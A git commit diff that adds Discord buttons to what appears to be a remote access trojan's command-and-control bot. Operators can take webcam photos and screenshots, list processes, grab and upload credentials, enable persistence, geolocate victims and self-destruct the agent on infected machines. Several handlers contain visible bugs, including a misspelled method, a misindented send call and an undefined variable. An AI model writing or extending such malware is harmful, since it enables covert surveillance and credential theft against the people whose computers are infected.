dc07e46c9de88737e808b9c48b9eac08afb8c495
Dimitris Kalopisis <dimitris@kalopisis.gr>
2023-08-31 16:07:07 +0300

    Added more buttons for features on ls command

--- code/discord/main.py
+++ code/discord/main.py
@@ -73,18 +73,93 @@ class InteractButton(discord.ui.View):
         self.inv  = inv
         self.id = id
 
-    @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple)
+    @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple, emoji="🔗")
     async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
         global CURRENT_AGENT
         CURRENT_AGENT = self.id
         await interaction.response.send_message(embed=discord.Embed(title=f"Interacted with agent {self.id}", color=0x00FF00), ephemeral=True)
 
-    @discord.ui.button(label="Terminate", style=discord.ButtonStyle.red)
+    @discord.ui.button(label="Terminate", style=discord.ButtonStyle.gray, emoji="❌")
     async def terminateButton(self, interaction:discord.Interaction, button:discord.ui.Button):
         my_embed = discord.Embed(title=f"Terminating Connection With Agent#{self.id}", color=0x00FF00)
         await interaction.response.send_message(embed=my_embed)
         await bot.close()        
         sys.exit()
+
+    @discord.ui.button(label="Webshot", style=discord.ButtonStyle.gray, emoji="📸")
+    async def webshot(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = disctopia.webshot()
+        if result != False:
+            await interaction.response.send_message(file=discord.File(result))
+            os.remove(result)
+        else:
+            my_embed = discord.Embed(title=f"Error while taking photo to Agent#{self.id}", color=0xFF0000)
+            await interaction.response.send_messagey(embed=my_embed)
+
+    @discord.ui.button(label="Process", style=discord.ButtonStyle.gray, emoji="📊")
+    async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = disctopia.process()
+        if len(result) > 4000:
+            path = os.environ["temp"] +"\\response.txt"         
+            with open(path, 'w') as file:
+                file.write(result)
+            await interaction.response.send_message(file=discord.File(path))
+            os.remove(path)
+        else:
+            await interaction.response.send_message(f"```\n{result}\n```")
+
+
+    @discord.ui.button(label="Screenshot", style=discord.ButtonStyle.gray, emoji="🖼️")
+    async def screenshot(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = disctopia.screenshot()
+        if result != False:
+            await interaction.response.send_message(file=discord.File(result))
+            os.remove(result)
+        else:
+            my_embed = discord.Embed(title=f"Error while taking screenshot to Agent#{self.id}", color=0xFF0000)
+            await interaction.response.send_message(embed=my_embed)
+
+    @discord.ui.button(label="Creds", style=discord.ButtonStyle.gray, emoji="🔑")
+    async def creds(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = disctopia.creds()
+        if result != False:
+            await interaction.response.send_message(file=discord.File(result))
+            os.remove(result)
+        else:
+            my_embed = discord.Embed(title=f"Error while grabbing credentials from Agent#{self.id}", color=0xFF0000)
+        await interaction.response.send_message(embed=my_embed)
+
+    @discord.ui.button(label="Persistent", style=discord.ButtonStyle.gray, emoji="🔁")
+    async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = disctopia.persistent()
+        if result:
+            my_embed = discord.Embed(title=f"Persistance enabled on Agent#{self.id}", color=0x00FF00)
+        else:
+            my_embed = discord.Embed(title=f"Error while enabling persistance on Agent#{self.id}", color=0xFF0000)
+        await interaction.response.send_message(embed=my_embed)
+
+    @discord.ui.button(label="Location", style=discord.ButtonStyle.gray, emoji="🌐")
+    async def location(self, interaction:discord.Interaction, button:discord.ui.Button):
+        response = disctopia.location()
+        if response != False:
+            my_embed = discord.Embed(title=f"IP Based Location on Agent#{self.id}", color=0x00FF00)
+            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
+            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
+            my_embed.add_field(name="City:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
+            my_embed.add_field(name="Country:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
+            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
+        else:
+            my_embed = discord.Embed(title=f"Error while getting location of Agent#{self.id}", color=0xFF0000)
+        await interaction.response.send_message(embed=my_embed)
+
+    @discord.ui.button(label="Selfdestruct", style=discord.ButtonStyle.red, emoji="💣")
+    async def selfdestruct(self, interaction:discord.Interaction, button:discord.ui.Button):
+        result = disctopia.selfdestruct()
+        if result:
+            my_embed = discord.Embed(title=f"Agent#{ID} has been deleted", color=0x00FF00)
+        else:
+            my_embed = discord.Embed(title=f"Error while deleting Agent#{self.id}: {result}", color=0xFF0000)
+        await interaction.response.send_message(embed=my_embed)
 
 bot = Bot()
 
